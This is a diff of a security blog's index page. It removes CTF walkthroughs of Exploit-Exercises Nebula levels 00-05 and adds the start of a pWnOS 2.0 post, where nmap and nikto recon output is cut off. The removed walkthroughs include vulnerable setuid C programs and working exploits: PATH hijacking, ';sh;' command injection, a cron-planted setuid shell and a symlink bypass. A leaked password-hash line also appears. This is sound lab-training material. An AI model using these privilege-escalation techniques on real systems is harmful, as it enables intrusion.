@@ -9,8 +9,21 @@
   <meta name="author" content="Norbert Szetei">
 
   
-  <meta name="description" content="Image: Exploit-Exercises: Nebula (v5) Because it was not possible to log in via ssh, we generated the host key: 1
-ssh-keygen -t rsa -f /etc/ssh/ &hellip;">
+  <meta name="description" content="Image: Hackademic: RTB2 We gained the IP address 192.168.80.150 for our testing target. Nmap output: 1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+root@kali32:# &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -79,461 +92,6 @@ ssh-keygen -t rsa -f /etc/ssh/ &hellip;">
     <div id="content">
       <div class="blog-index">
   
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2015/06/16/exploit-exercises-nebula-00-05/">Exploit-Exercises: Nebula (00-05)</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2015-06-16T19:04:18+02:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>16</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>7:04 pm</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Image: <a href="https://www.vulnhub.com/entry/exploit-exercises-nebula-v5,31/">Exploit-Exercises: Nebula (v5)</a></p>
-
-<p>Because it was not possible to log in via ssh, we generated the host key:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>ssh-keygen -t rsa -f /etc/ssh/ssh_host_rsa_key</span></code></pre></td></tr></table></div></figure>
-
-
-<h2>Level00</h2>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">level00@nebula:~$</span> find / <span class="se">\(</span> -perm -4000 <span class="se">\)</span> 2&gt;/dev/null
-</span><span class='line'><span class="go">/bin/.../flag00</span>
-</span><span class='line'><span class="go">/bin/fusermount</span>
-</span><span class='line'><span class="go">/bin/mount</span>
-</span><span class='line'><span class="go">/bin/ping</span>
-</span><span class='line'><span class="go">/bin/ping6</span>
-</span><span class='line'><span class="go">/bin/su</span>
-</span><span class='line'><span class="go">[ .. SNIP .. ]</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>We found a suspicious file on the first line, after executing, we obtained flag.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">level00@nebula:~$</span> id
-</span><span class='line'><span class="go">uid=1001(level00) gid=1001(level00) groups=1001(level00)</span>
-</span><span class='line'><span class="gp">level00@nebula:~$</span> /bin/.../flag00
-</span><span class='line'><span class="go">Congrats, now run getflag to get your flag!</span>
-</span><span class='line'><span class="gp">flag00@nebula:~$</span> id
-</span><span class='line'><span class="go">uid=999(flag00) gid=1001(level00) groups=999(flag00),1001(level00)</span>
-</span><span class='line'><span class="gp">flag00@nebula:~$</span> getflag
-</span><span class='line'><span class="go">You have successfully executed getflag on a target account</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<h2>Level01</h2>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>  <span class="kt">gid_t</span> <span class="n">gid</span><span class="p">;</span>
-</span><span class='line'>  <span class="kt">uid_t</span> <span class="n">uid</span><span class="p">;</span>
-</span><span class='line'>  <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
-</span><span class='line'>  <span class="n">uid</span> <span class="o">=</span> <span class="n">geteuid</span><span class="p">();</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
-</span><span class='line'>  <span class="n">setresuid</span><span class="p">(</span><span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="n">system</span><span class="p">(</span><span class="s">&quot;/usr/bin/env echo and now what?&quot;</span><span class="p">);</span>
-</span><span class='line'><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Solution:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">level01@nebula:~$</span> <span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>.:<span class="nv">$PATH</span>
-</span><span class='line'><span class="gp">level01@nebula:~$</span> <span class="nb">echo</span> <span class="s1">&#39;sh&#39;</span> &gt; <span class="nb">echo</span>
-</span><span class='line'><span class="gp">level01@nebula:~$</span><span class="nb"> </span>chmod +x ./echo
-</span><span class='line'><span class="gp">level01@nebula:~$</span> id
-</span><span class='line'><span class="go">uid=1002(level01) gid=1002(level01) groups=1002(level01)</span>
-</span><span class='line'><span class="gp">level01@nebula:~$</span> /home/flag01/flag01
-</span><span class='line'><span class="gp">sh-4.2$</span> id
-</span><span class='line'><span class="go">uid=998(flag01) gid=1002(level01) groups=998(flag01),1002(level01)</span>
-</span><span class='line'><span class="gp">sh-4.2$</span> getflag
-</span><span class='line'><span class="go">You have successfully executed getflag on a target account</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<h2>Level02</h2>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="kt">gid_t</span> <span class="n">gid</span><span class="p">;</span>
-</span><span class='line'>  <span class="kt">uid_t</span> <span class="n">uid</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
-</span><span class='line'>  <span class="n">uid</span> <span class="o">=</span> <span class="n">geteuid</span><span class="p">();</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
-</span><span class='line'>  <span class="n">setresuid</span><span class="p">(</span><span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="n">buffer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="n">asprintf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">,</span> <span class="s">&quot;/bin/echo %s is cool&quot;</span><span class="p">,</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&quot;USER&quot;</span><span class="p">));</span>
-</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;about to call system(</span><span class="se">\&quot;</span><span class="s">%s</span><span class="se">\&quot;</span><span class="s">)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="n">system</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
-</span><span class='line'><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Solution:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">level02@nebula:~$</span> <span class="nb">export </span><span class="nv">USER</span><span class="o">=</span><span class="s1">&#39;;sh;&#39;</span>
-</span><span class='line'><span class="gp">level02@nebula:~$</span> /home/flag02/flag02
-</span><span class='line'><span class="go">about to call system(&quot;/bin/echo ;sh; is cool&quot;)</span>
-</span><span class='line'>
-</span><span class='line'><span class="gp">sh-4.2$</span> getflag
-</span><span class='line'><span class="go">You have successfully executed getflag on a target account</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<h2>Level03</h2>
-
-<p>There is a crontab entry that is called every couple of minutes.</p>
-
-<p>Because the /tmp is mounted with nosuid option, we use home directory to store suid binary:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">level03@nebula:~$</span> mount <span class="p">|</span> grep nosuid
-</span><span class='line'><span class="go">proc on /proc type proc (rw,noexec,nosuid,nodev)</span>
-</span><span class='line'><span class="go">sysfs on /sys type sysfs (rw,noexec,nosuid,nodev)</span>
-</span><span class='line'><span class="go">devpts on /dev/pts type devpts (rw,noexec,nosuid,gid=5,mode=0620)</span>
-</span><span class='line'><span class="go">tmpfs on /run type tmpfs (rw,noexec,nosuid,size=10%,mode=0755)</span>
-</span><span class='line'><span class="go">tmpfs on /tmp type tmpfs (rw,nosuid,nodev)</span>
-</span><span class='line'><span class="go">none on /run/lock type tmpfs (rw,noexec,nosuid,nodev,size=5242880)</span>
-</span><span class='line'><span class="go">none on /run/shm type tmpfs (rw,nosuid,nodev)</span>
-</span><span class='line'><span class="go">vmware-vmblock on /run/vmblock-fuse type fuse.vmware-vmblock (rw,nosuid,nodev,default_permissions,allow_other)</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>The file invoked by cron is here:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>level03@nebula:/home/flag03<span class="nv">$ </span>cat writable.sh
-</span><span class='line'><span class="c">#!/bin/sh</span>
-</span><span class='line'>
-</span><span class='line'><span class="k">for</span> i in /home/flag03/writable.d/* <span class="p">;</span> <span class="k">do</span>
-</span><span class='line'>  <span class="o">(</span><span class="nb">ulimit</span> -t 5<span class="p">;</span> bash -x <span class="s2">&quot;$i&quot;</span><span class="o">)</span>
-</span><span class='line'>  rm -f <span class="s2">&quot;$i&quot;</span>
-</span><span class='line'><span class="k">done</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p></p>
-
-<p>Our code to obtain suid shell:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>level03@nebula:~<span class="nv">$ </span><span class="nb">cd</span> /home/flag03/writable.d/
-</span><span class='line'>
-</span><span class='line'>level03@nebula:/home/flag03/writable.d<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">&#39;#include &lt;stdio.h&gt;</span>
-</span><span class='line'><span class="s1">#include &lt;stdlib.h&gt;</span>
-</span><span class='line'><span class="s1">#include &lt;sys/types.h&gt;</span>
-</span><span class='line'><span class="s1">#include &lt;unistd.h&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="s1">int main()</span>
-</span><span class='line'><span class="s1">{</span>
-</span><span class='line'><span class="s1">   setreuid(geteuid(),geteuid());</span>
-</span><span class='line'><span class="s1">   execve(&quot;/bin/sh&quot;, NULL, NULL);</span>
-</span><span class='line'>
-</span><span class='line'><span class="s1">   return 0;</span>
-</span><span class='line'><span class="s1">}</span>
-</span><span class='line'><span class="s1">&#39;</span> &gt; /tmp/run.c
-</span><span class='line'>
-</span><span class='line'>
-</span><span class='line'>level03@nebula:/home/flag03/writable.d<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">&#39;#!/bin/bash</span>
-</span><span class='line'><span class="s1">gcc /tmp/run.c -o /home/flag03/x</span>
-</span><span class='line'><span class="s1">chmod +s /home/flag03/x</span>
-</span><span class='line'><span class="s1">&#39;</span> &gt; run.sh
-</span><span class='line'>level03@nebula:/home/flag03/writable.d<span class="nv">$ </span>chmod +x run.sh
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>After a little waiting, the suid binary is created:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>level03@nebula:/home/flag03/writable.d<span class="nv">$ </span>../x
-</span><span class='line'>bash-4.2<span class="nv">$ </span>getflag
-</span><span class='line'>You have successfully executed getflag on a target account
-</span></code></pre></td></tr></table></div></figure>
-
-
-<h2>Level04</h2>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;fcntl.h&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
-</span><span class='line'>  <span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="n">rc</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s [file to read]</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
-</span><span class='line'>      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
-</span><span class='line'>  <span class="p">}</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">&quot;token&quot;</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;You may not access &#39;%s&#39;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
-</span><span class='line'>      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
-</span><span class='line'>  <span class="p">}</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">O_RDONLY</span><span class="p">);</span>
-</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">,</span> <span class="s">&quot;Unable to open %s&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
-</span><span class='line'>  <span class="p">}</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="n">rc</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">rc</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">,</span> <span class="s">&quot;Unable to read fd %d&quot;</span><span class="p">,</span> <span class="n">fd</span><span class="p">);</span>
-</span><span class='line'>  <span class="p">}</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">rc</span><span class="p">);</span>
-</span><span class='line'><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>We cannot read the token file, but symlink technique is sufficient:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>level04@nebula:~$ cd /home/flag04/
-</span><span class='line'>level04@nebula:/home/flag04$ ./flag04 
-</span><span class='line'>./flag04 [file to read]
-</span><span class='line'>level04@nebula:/home/flag04$ ./flag04 token 
-</span><span class='line'>You may not access 'token'
-</span><span class='line'>level04@nebula:/home/flag04$ ln -s /home/flag04/token /tmp/x
-</span><span class='line'>level04@nebula:/home/flag04$ ./flag04 /tmp/x 
-</span><span class='line'>06508b5e-8909-4f38-b630-fdb148a848a2
-</span><span class='line'>level04@nebula:/home/flag04$ su - flag04
-</span><span class='line'>Password: 
-</span><span class='line'>flag04@nebula:~$ getflag 
-</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure>
-
-
-<h2>Level05</h2>
-
-<p>In /home/flag05 we can find the backup file with ssh private key.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">level05@nebula:/home/flag05$</span> tar xvzf .backup/backup-19072011.tgz  -C /tmp/
-</span><span class='line'><span class="go">.ssh/</span>
-</span><span class='line'><span class="go">.ssh/id_rsa.pub</span>
-</span><span class='line'><span class="go">.ssh/id_rsa</span>
-</span><span class='line'><span class="go">.ssh/authorized_keys</span>
-</span><span class='line'>
-</span><span class='line'><span class="gp">level05@nebula:/home/flag05$</span> ssh -i /tmp/.ssh/id_rsa flag05@0
-</span><span class='line'><span class="gp">flag05@nebula:~$</span> getflag
-</span><span class='line'><span class="go">You have successfully executed getflag on a target account</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-
-</div>
-  
-  
-
-
-    </article>
   
   
     <article>
@@ -1923,6 +1481,412 @@ was the reason why we didn&rsquo;t found out this firstly.</p>
 </span><span class='line'>p0wnbox.Team:<span class="nv">$6$rPArLuwe8rM9Avwv$a5coOdUCQQY7NgvTnXaFj2D5SmggRrFsr6TP8g7IATVeEt37LUGJYvHM1myhelCyPkIjd8Yv5olMnUhwbQL76</span>/:14981:0:99999:7:::
 </span><span class='line'>mysql:!!:14981::::::
 </span></code></pre></td></tr></table></div></figure>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/05/22/pwnos-2-dot-0/">pWnOS: 2.0</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-05-22T08:40:50+02:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>22</span><span class='date-suffix'>nd</span>, <span class='date-year'>2015</span></span> <span class='time'>8:40 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Image: <a href="https://www.vulnhub.com/entry/pwnos-20-pre-release,34/">pWnOS: 2.0 (Pre-Release)</a></p>
+
+<p>Nmap output:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# nmap 10.10.10.100 -sV -p-
+</span><span class='line'>
+</span><span class='line'>Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-27 14:45 CEST
+</span><span class='line'>Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+</span><span class='line'>Service scan Timing: About 50.00% done; ETC: 14:45 (0:00:06 remaining)
+</span><span class='line'>Nmap scan report for 10.10.10.100
+</span><span class='line'>Host is up (0.00030s latency).
+</span><span class='line'>Not shown: 65533 closed ports
+</span><span class='line'>PORT   STATE SERVICE VERSION
+</span><span class='line'>22/tcp open  ssh     OpenSSH 5.8p1 Debian 1ubuntu3 (Ubuntu Linux; protocol 2.0)
+</span><span class='line'>80/tcp open  http    Apache httpd 2.2.17 ((Ubuntu))
+</span><span class='line'>MAC Address: 00:0C:29:61:0D:EB (VMware)
+</span><span class='line'>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span><span class='line'>
+</span><span class='line'>Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 7.54 seconds</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Nikto output:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# nikto -h 10.10.10.100
+</span><span class='line'>- Nikto v2.1.6
+</span><span class='line'>---------------------------------------------------------------------------
+</span><span class='line'>+ Target IP:          10.10.10.100
+</span><span class='line'>+ Target Hostname:    10.10.10.100
+</span><span class='line'>+ Target Port:        80
+</span><span class='line'>+ Start Time:         2015-04-27 14:46:59 (GMT2)
+</span><span class='line'>---------------------------------------------------------------------------
+</span><span class='line'>+ Server: Apache/2.2.17 (Ubuntu)
+</span><span class='line'>+ Cookie PHPSESSID created without the httponly flag
